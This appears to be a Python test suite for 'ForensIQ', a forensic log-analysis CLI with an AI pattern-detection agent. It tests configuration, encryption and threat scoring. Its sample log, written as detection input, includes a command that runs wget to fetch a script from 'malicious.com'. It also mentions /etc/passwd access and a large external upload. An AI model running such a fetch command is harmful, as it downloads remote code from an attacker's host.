#!/usr/bin/env python3
"""
Test script for ForensIQ CLI Tool

This script tests basic functionality of the CLI tool including:
- Configuration loading
- Authentication simulation
- Log analysis
- AI agent integration

Usage:
    python test_cli.py
"""

import os
import sys
import tempfile
import json
from pathlib import Path

# Add current directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from cli_tool import ForensIQCLI
from ai_agent import AIAgent

def create_test_log():
    """Create a test log file for analysis."""
    test_log_content = """
2025-08-29 10:15:23 INFO User admin logged in successfully
2025-08-29 10:16:45 WARNING Failed login attempt for user hacker from IP 192.168.1.100
2025-08-29 10:17:12 ERROR Invalid authentication token detected
2025-08-29 10:18:34 INFO File access: /etc/passwd requested by user admin
2025-08-29 10:19:56 CRITICAL Suspicious process execution detected: /bin/bash -c 'wget malicious.com/script.sh'
2025-08-29 10:20:17 WARNING Multiple failed login attempts from IP 192.168.1.100
2025-08-29 10:21:38 INFO Network connection established to 10.0.0.5:22
2025-08-29 10:22:59 ERROR Privilege escalation attempt detected for user guest
2025-08-29 10:24:21 INFO Data transfer: 1.2GB uploaded to external server
2025-08-29 10:25:42 CRITICAL Malicious activity detected: unauthorized file deletion
"""
    
    # Create temporary file
    with tempfile.NamedTemporaryFile(mode='w', suffix='.log', delete=False) as f:
        f.write(test_log_content.strip())
        return f.name

def test_cli_initialization():
    """Test CLI tool initialization."""
    print("Testing CLI initialization...")
    
    # Create temporary config directory
    with tempfile.TemporaryDirectory() as temp_dir:
        config_dir = Path(temp_dir) / ".forensiq"
        
        # Initialize CLI with custom config directory
        cli = ForensIQCLI()
        cli.config_dir = config_dir
        cli.config_file = config_dir / "config.json"
        cli.credentials_file = config_dir / "credentials.enc"
        cli._setup_directories()
        
        assert config_dir.exists(), "Config directory should be created"
        assert cli.config is not None, "Config should be initialized"
        print("✓ CLI initialization successful")
        
        return cli

def test_ai_agent_integration():
    """Test AI agent integration."""
    print("\nTesting AI agent integration...")
    
    cli = test_cli_initialization()
    
    # Initialize AI agent
    ai_agent = AIAgent(cli)
    
    # Test pattern extraction
    test_log = create_test_log()
    
    try:
        with open(test_log, 'r') as f:
            log_content = f.read()
        
        patterns = ai_agent.extract_log_patterns(log_content)
        
        assert len(patterns) > 0, "Should detect patterns in test log"
        print(f"✓ Detected {len(patterns)} log patterns")
        
        # Test threat context analysis
        threat_context = ai_agent.analyze_threat_context(patterns)
        
        assert threat_context.severity_score > 0, "Should calculate severity score"
        print(f"✓ Threat analysis completed (severity: {threat_context.severity_score:.2f})")
        
        # Test adaptive scheduling
        next_interval = ai_agent.adaptive_schedule_analysis(threat_context)
        
        assert next_interval > 0, "Should calculate next interval"
        print(f"✓ Adaptive scheduling (next interval: {next_interval}s)")
        
    finally:
        # Clean up test file
        os.unlink(test_log)
    
    print("✓ AI agent integration successful")
    return ai_agent

def test_configuration_management():
    """Test configuration loading and saving."""
    print("\nTesting configuration management...")
    
    cli = test_cli_initialization()
    
    # Test config update
    test_config = {
        "api_url": "http://test.example.com",
        "monitoring": {
            "interval": 600,
            "max_results": 10
        },
        "ai_agent_enabled": True
    }
    
    cli.config.update(test_config)
    cli._save_config()
    
    # Test config reload
    cli.config = {}
    cli._load_config()
    
    assert cli.config["api_url"] == test_config["api_url"], "Config should persist"
    assert cli.config["monitoring"]["interval"] == 600, "Nested config should persist"
    
    print("✓ Configuration management successful")

def test_log_pattern_learning():
    """Test AI agent pattern learning."""
    print("\nTesting pattern learning...")
    
    cli = test_cli_initialization()
    ai_agent = AIAgent(cli)
    
    # Create multiple test logs to simulate learning
    test_logs = [
        "2025-08-29 10:00:00 WARNING Failed login for user admin",
        "2025-08-29 10:01:00 WARNING Failed login for user admin", 
        "2025-08-29 10:02:00 WARNING Failed login for user test",
        "2025-08-29 10:03:00 ERROR Privilege escalation detected",
        "2025-08-29 10:04:00 CRITICAL Suspicious process execution"
    ]
    
    initial_patterns = len(ai_agent.learned_patterns)
    
    for log in test_logs:
        patterns = ai_agent.extract_log_patterns(log)
        # Simulate pattern learning
    
    final_patterns = len(ai_agent.learned_patterns)
    
    assert final_patterns >= initial_patterns, "Should learn new patterns"
    print(f"✓ Pattern learning successful (learned {final_patterns - initial_patterns} new patterns)")

def test_encryption():
    """Test encryption functionality."""
    print("\nTesting encryption...")
    
    cli = test_cli_initialization()
    
    # Test data encryption
    test_data = "sensitive_authentication_token_12345"
    password = "test_password"
    
    key = cli._generate_encryption_key(password)
    encrypted = cli._encrypt_data(test_data, key)
    decrypted = cli._decrypt_data(encrypted, key)
    
    assert decrypted == test_data, "Decrypted data should match original"
    assert encrypted != test_data, "Encrypted data should be different"
    
    print("✓ Encryption functionality successful")

def run_all_tests():
    """Run all tests."""
    print("ForensIQ CLI Tool - Test Suite")
    print("=" * 40)
    
    try:
        test_cli_initialization()
        test_configuration_management()
        test_encryption()
        test_ai_agent_integration()
        test_log_pattern_learning()
        
        print("\n" + "=" * 40)
        print("✅ All tests passed successfully!")
        print("\nCLI tool is ready for use. Try:")
        print("  python cli_tool.py --help")
        
    except Exception as e:
        print(f"\n❌ Test failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    run_all_tests()
